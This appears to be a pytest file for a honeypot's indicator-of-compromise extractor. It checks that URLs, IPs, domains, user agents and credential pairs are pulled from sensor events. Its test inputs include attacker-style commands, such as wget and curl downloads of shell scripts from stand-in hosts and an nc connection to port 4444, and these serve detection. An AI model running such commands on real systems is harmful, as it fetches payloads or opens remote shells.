from app.ioc import Indicator, extract
from app.schemas import Event


def make_event(**overrides) -> Event:
    defaults = dict(
        sensor_id="hive-dev",
        service="ssh",
        event_type="command",
        source_ip="203.0.113.7",
    )
    return Event(**{**defaults, **overrides})


def values_of(event: Event, ioc_type: str) -> set[str]:
    return {i.value for i in extract(event) if i.type == ioc_type}


def test_source_ip_is_always_an_indicator():
    assert "203.0.113.7" in values_of(make_event(payload={"command": "ls"}), "ip")


def test_extracts_url_and_its_domain_from_a_download_command():
    event = make_event(payload={"command": "wget http://evil.example.com/bot.sh"})
    assert values_of(event, "url") == {"http://evil.example.com/bot.sh"}
    assert "evil.example.com" in values_of(event, "domain")


def test_url_host_that_is_an_ip_is_recorded_as_an_ip_not_a_domain():
    event = make_event(payload={"command": "curl http://185.243.115.84/x.sh"})
    assert "185.243.115.84" in values_of(event, "ip")
    assert values_of(event, "domain") == set()


def test_strips_trailing_punctuation_from_urls():
    event = make_event(payload={"command": "wget http://evil.example.com/a.sh;"})
    assert values_of(event, "url") == {"http://evil.example.com/a.sh"}


def test_extracts_bare_ip_from_a_command():
    event = make_event(payload={"command": "nc 198.51.100.9 4444"})
    assert "198.51.100.9" in values_of(event, "ip")


def test_ignores_things_that_only_look_like_ips():
    event = make_event(payload={"command": "echo 999.999.999.999"})
    assert "999.999.999.999" not in values_of(event, "ip")


def test_extracts_user_agent_from_http_request():
    event = make_event(
        service="http",
        event_type="http_request",
        payload={"path": "/wp-login.php", "headers": {"user-agent": "masscan/1.3"}},
    )
    assert values_of(event, "user_agent") == {"masscan/1.3"}


def test_extracts_credential_pair_from_auth_attempt():
    event = make_event(
        event_type="auth_attempt",
        payload={"username": "root", "password": "adminpass", "success": True},
    )
    assert values_of(event, "credential") == {"root:adminpass"}


def test_indicators_are_deduplicated():
    event = make_event(payload={"command": "wget http://203.0.113.7/a.sh"})
    indicators = extract(event)
    assert len(indicators) == len(set(indicators))


def test_confidence_ranks_payload_urls_above_bare_connections():
    url = Indicator("url", "http://evil.example.com/a.sh", "ssh")
    ip = Indicator("ip", "203.0.113.7", "ssh")
    assert url.base_confidence > ip.base_confidence
